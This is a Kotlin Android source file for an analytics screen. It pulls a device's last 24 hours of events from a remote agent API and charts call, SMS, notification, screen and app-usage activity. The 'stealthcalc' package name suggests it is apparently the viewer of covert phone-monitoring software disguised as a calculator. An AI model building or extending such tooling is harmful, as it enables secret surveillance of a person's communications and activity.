package com.stealthcalc.monitoring.ui

import androidx.compose.foundation.Canvas
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.material3.TopAppBar
import androidx.compose.material3.TopAppBarDefaults
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.geometry.Size
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.hilt.navigation.compose.hiltViewModel
import androidx.lifecycle.ViewModel
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import androidx.lifecycle.viewModelScope
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.model.EventPayload
import com.stealthcalc.monitoring.network.AgentApiClient
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import javax.inject.Inject

data class AnalyticsState(
    val isLoading: Boolean = false,
    val appUsageMinutes: List<Pair<String, Int>> = emptyList(),
    val hourlyActivity: List<Pair<Int, Int>> = emptyList(),
    val totalScreenEvents: Int = 0,
    val totalNotifications: Int = 0,
    val totalCalls: Int = 0,
    val totalMessages: Int = 0,
)

@HiltViewModel
class AnalyticsViewModel @Inject constructor(
    private val repository: MonitoringRepository,
    private val apiClient: AgentApiClient,
) : ViewModel() {

    private val json = Json { ignoreUnknownKeys = true }
    private val _state = MutableStateFlow(AnalyticsState())
    val state: StateFlow<AnalyticsState> = _state.asStateFlow()

    init { load() }

    fun load() {
        viewModelScope.launch {
            _state.value = AnalyticsState(isLoading = true)
            val deviceId = repository.deviceId
            if (deviceId.isBlank()) return@launch

            val events = apiClient.getEvents(
                deviceId, since = System.currentTimeMillis() - 24 * 3600 * 1000L
            )

            val appMinutes = computeAppUsageMinutes(events)
            val hourly = computeHourlyActivity(events)
            val screens = events.count { it.kind == "SCREEN_EVENT" }
            val notifs = events.count { it.kind == "NOTIFICATION" }
            val calls = events.count { it.kind == "CALL_LOG" }
            val messages = events.count { it.kind == "SMS" }

            _state.value = AnalyticsState(
                appUsageMinutes = appMinutes,
                hourlyActivity = hourly,
                totalScreenEvents = screens,
                totalNotifications = notifs,
                totalCalls = calls,
                totalMessages = messages,
            )
        }
    }

    private fun computeAppUsageMinutes(events: List<EventPayload>): List<Pair<String, Int>> {
        val fgEvents = events.filter { it.kind == "APP_USAGE" }
            .mapNotNull { e ->
                val obj = runCatching { json.parseToJsonElement(e.payload).jsonObject }.getOrNull() ?: return@mapNotNull null
                val action = obj["event"]?.jsonPrimitive?.content ?: return@mapNotNull null
                val app = obj["appName"]?.jsonPrimitive?.content ?: obj["packageName"]?.jsonPrimitive?.content ?: return@mapNotNull null
                Triple(app, action, e.capturedAt)
            }
            .sortedBy { it.third }

        val durations = mutableMapOf<String, Long>()
        var lastFg: Pair<String, Long>? = null

        for ((app, action, time) in fgEvents) {
            if (action == "FOREGROUND") {
                lastFg?.let { (prevApp, prevTime) ->
                    val dur = (time - prevTime).coerceAtMost(30 * 60 * 1000L)
                    durations[prevApp] = (durations[prevApp] ?: 0) + dur
                }
                lastFg = app to time
            } else if (action == "BACKGROUND") {
                if (lastFg?.first == app) {
                    val dur = (time - lastFg!!.second).coerceAtMost(30 * 60 * 1000L)
                    durations[app] = (durations[app] ?: 0) + dur
                    lastFg = null
                }
            }
        }

        return durations.entries
            .sortedByDescending { it.value }
            .take(10)
            .map { (app, ms) -> app to (ms / 60_000).toInt().coerceAtLeast(1) }
    }

    private fun computeHourlyActivity(events: List<EventPayload>): List<Pair<Int, Int>> {
        val hourCounts = IntArray(24)
        for (event in events) {
            val cal = java.util.Calendar.getInstance().apply { timeInMillis = event.capturedAt }
            hourCounts[cal.get(java.util.Calendar.HOUR_OF_DAY)]++
        }
        return hourCounts.mapIndexed { hour, count -> hour to count }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun AnalyticsScreen(
    onBack: () -> Unit,
    viewModel: AnalyticsViewModel = hiltViewModel(),
) {
    val state by viewModel.state.collectAsStateWithLifecycle()

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("Analytics") },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.background,
                    titleContentColor = MaterialTheme.colorScheme.onBackground,
                )
            )
        }
    ) { padding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .padding(horizontal = 16.dp)
                .verticalScroll(rememberScrollState()),
            verticalArrangement = Arrangement.spacedBy(12.dp),
        ) {
            Spacer(modifier = Modifier.height(4.dp))

            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(8.dp),
            ) {
                StatCard("Screen", state.totalScreenEvents.toString(), Modifier.weight(1f))
                StatCard("Notifs", state.totalNotifications.toString(), Modifier.weight(1f))
                StatCard("Calls", state.totalCalls.toString(), Modifier.weight(1f))
                StatCard("SMS", state.totalMessages.toString(), Modifier.weight(1f))
            }

            if (state.hourlyActivity.isNotEmpty()) {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Text("Activity by Hour (24h)", style = MaterialTheme.typography.titleSmall)
                        Spacer(modifier = Modifier.height(8.dp))
                        HourlyBarChart(state.hourlyActivity)
                    }
                }
            }

            if (state.appUsageMinutes.isNotEmpty()) {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Text("App Usage (minutes, 24h)", style = MaterialTheme.typography.titleSmall)
                        Spacer(modifier = Modifier.height(8.dp))
                        state.appUsageMinutes.forEach { (app, mins) ->
                            Row(modifier = Modifier.fillMaxWidth().padding(vertical = 2.dp)) {
                                Text(
                                    app,
                                    style = MaterialTheme.typography.bodySmall,
                                    modifier = Modifier.width(120.dp),
                                    maxLines = 1,
                                    overflow = TextOverflow.Ellipsis,
                                )
                                val maxMins = state.appUsageMinutes.maxOfOrNull { it.second } ?: 1
                                Canvas(
                                    modifier = Modifier
                                        .weight(1f)
                                        .height(14.dp)
                                        .padding(horizontal = 4.dp)
                                ) {
                                    val barWidth = (size.width * mins / maxMins).coerceAtLeast(4f)
                                    drawRect(
                                        color = Color(0xFF6200EE),
                                        topLeft = Offset.Zero,
                                        size = Size(barWidth, size.height),
                                    )
                                }
                                Text("${mins}m", style = MaterialTheme.typography.labelSmall)
                            }
                        }
                    }
                }
            }

            Spacer(modifier = Modifier.height(16.dp))
        }
    }
}

@Composable
private fun StatCard(label: String, value: String, modifier: Modifier) {
    Card(
        modifier = modifier,
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
    ) {
        Column(modifier = Modifier.padding(12.dp)) {
            Text(value, style = MaterialTheme.typography.titleLarge)
            Text(label, style = MaterialTheme.typography.labelSmall, color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f))
        }
    }
}

@Composable
private fun HourlyBarChart(data: List<Pair<Int, Int>>) {
    val maxCount = data.maxOfOrNull { it.second }?.coerceAtLeast(1) ?: 1
    val barColor = Color(0xFF6200EE)

    Canvas(
        modifier = Modifier
            .fillMaxWidth()
            .height(80.dp)
    ) {
        val barWidth = size.width / 24f
        data.forEach { (hour, count) ->
            val barHeight = (count.toFloat() / maxCount) * size.height
            drawRect(
                color = barColor,
                topLeft = Offset(hour * barWidth + 1, size.height - barHeight),
                size = Size(barWidth - 2, barHeight),
            )
        }
    }
    Row(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.SpaceBetween,
    ) {
        Text("0", style = MaterialTheme.typography.labelSmall, color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.4f))
        Text("6", style = MaterialTheme.typography.labelSmall, color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.4f))
        Text("12", style = MaterialTheme.typography.labelSmall, color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.4f))
        Text("18", style = MaterialTheme.typography.labelSmall, color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.4f))
        Text("24", style = MaterialTheme.typography.labelSmall, color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.4f))
    }
}
